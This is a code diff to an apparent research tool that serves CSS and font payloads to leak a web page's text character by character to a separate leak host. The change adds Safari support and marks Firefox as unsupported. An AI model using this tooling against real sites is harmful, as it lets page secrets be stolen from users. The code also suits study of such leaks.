@@ -15,6 +15,7 @@ import asyncio
 from user_agents import parse
 from typing import Literal
 import os
+import base64
 
 # Add in-memory storage for leak states and events
 leak_states: dict[str, DynamicLeakState] = {}
@@ -81,6 +82,10 @@ async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
                 params.alphabet, prefix=params.prefix or "", strip=params.strip
             )
             browser = get_browser(request)
+            if browser == "safari":
+                base_params.alphabet = base_params.alphabet.replace(
+                    " ", ""
+                )  # Safari doesn't support spaces for some reason
             leak_states[new_id] = DynamicLeakState(
                 id=new_id,
                 setup=base_params,
@@ -91,6 +96,7 @@ async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
                 browser=browser,
                 prefix=params.prefix or "",
                 strip=params.strip,
+                length=params.length,
             )
             params.id = new_id
 
@@ -114,7 +120,7 @@ async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
             step=state.step,
             step_map=state.step_map,
             template=template,
-            alphabet_size=len(params.alphabet),
+            alphabet_size=len(state.setup.alphabet),
             font_path=state.font_path,
             host=settings.host,
             host_leak=settings.host_leak,
@@ -123,30 +129,34 @@ async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
         )
         return Response(content=css, media_type="text/css")
 
+    if state.browser == "firefox":
+        raise NotImplementedError("Firefox is not supported yet")
+
+    # Safari / unknown browser
     if params.step is None:
-        # sequential font chaining for Firefox and Safari
         template = templates.get_template("dynamic-sfc.css.jinja")
         css = dynamic_css.generate_sfc(
             id=state.id,
             idx_max=128,
             step=state.step,
             template=template,
-            alphabet_size=len(params.alphabet),
+            alphabet_size=len(state.setup.alphabet),
             host=settings.host,
             host_leak=settings.host_leak,
             leak_selector=params.selector,
             browser=state.browser,
+            length=state.length,
         )
         return Response(content=css, media_type="text/css")
 
     font_path, _ = dynamic_font.generate(
         DynamicLeakSetupParams.model_fields["alphabet"].default,
-        idx_max=10,
+        idx_max=1,
         strip=True,
         prefix=state.prefix + state.reconstruction,
         prefix_idx=True,
+        offset=len(state.reconstruction) * (len(state.setup.alphabet) + 1),
     )
-    import base64
 
     font_data = base64.b64decode(font_path.split("data:font/opentype;base64,")[-1])
     return Response(
@@ -219,6 +229,11 @@ def test(request: Request):
     if browser == "chrome":
         return Response(
             content=templates.get_template("test-dynamic-chrome.html.jinja").render(),
+            media_type="text/html",
+        )
+    if browser == "safari":
+        return Response(
+            content=templates.get_template("test-dynamic-safari.html.jinja").render(),
             media_type="text/html",
         )
 
